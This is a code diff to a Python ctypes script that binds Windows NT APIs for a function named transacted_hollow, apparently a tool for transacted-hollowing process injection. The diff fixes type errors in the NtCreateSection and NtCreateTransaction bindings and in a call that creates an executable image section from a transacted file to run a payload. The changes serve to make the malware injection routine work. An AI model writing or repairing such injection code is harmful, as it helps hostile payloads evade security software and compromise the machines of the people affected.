@@ -40,7 +40,7 @@ n=ctypes.windll.ntdll
 
 # NT API functions
 NtCreateSection=n.NtCreateSection
-NtCreateSection.argtypes=[ctypes.POINTER(wintypes.HANDLE),wintypes.ACCESS_MASK,ctypes.POINTER(OBJECT_ATTRIBUTES),ctypes.POINTER(ctypes.c_uint64),wintypes.ULONG,wintypes.ULONG,wintypes.HANDLE]
+NtCreateSection.argtypes=[ctypes.POINTER(wintypes.HANDLE),wintypes.DWORD,ctypes.POINTER(OBJECT_ATTRIBUTES),ctypes.POINTER(ctypes.c_uint64),wintypes.ULONG,wintypes.ULONG,wintypes.HANDLE]
 NtCreateSection.restype=ctypes.c_ulong
 
 NtMapViewOfSection=n.NtMapViewOfSection
@@ -85,7 +85,7 @@ CloseHandle.restype=wintypes.BOOL
 
 # Transaction APIs
 NtCreateTransaction=n.NtCreateTransaction
-NtCreateTransaction.argtypes=[ctypes.POINTER(wintypes.HANDLE),wintypes.ACCESS_MASK,ctypes.POINTER(OBJECT_ATTRIBUTES),ctypes.POINTER(ctypes.c_uint64),wintypes.ULONG,wintypes.ULONG,wintypes.ULONG,ctypes.POINTER(UNICODE_STRING),wintypes.HANDLE,ctypes.POINTER(ctypes.c_uint64)]
+NtCreateTransaction.argtypes=[ctypes.POINTER(wintypes.HANDLE),wintypes.DWORD,ctypes.POINTER(OBJECT_ATTRIBUTES),ctypes.POINTER(ctypes.c_uint64),wintypes.ULONG,wintypes.ULONG,wintypes.ULONG,ctypes.POINTER(UNICODE_STRING),wintypes.HANDLE,ctypes.POINTER(ctypes.c_uint64)]
 NtCreateTransaction.restype=ctypes.c_ulong
 
 ktm=ctypes.windll.ktmw32
@@ -122,7 +122,7 @@ def transacted_hollow(payload):
     sectionAttr=OBJECT_ATTRIBUTES()
     sectionAttr.Length=ctypes.sizeof(OBJECT_ATTRIBUTES)
     size=ctypes.c_uint64(len(payload))
-    status=NtCreateSection(ctypes.byref(hSection),0xF0000000,ctypes.byref(sectionAttr),ctypes.byref(size),PAGE_EXECUTE_READWRITE,SEC_IMAGE,hTransactedFile)
+    status=NtCreateSection(ctypes.byref(hSection),wintypes.DWORD(0xF0000000),ctypes.byref(sectionAttr),ctypes.byref(size),PAGE_EXECUTE_READWRITE,SEC_IMAGE,hTransactedFile)
     CloseHandle(hTransactedFile)
     if status!=0:
         CloseHandle(hTransaction)
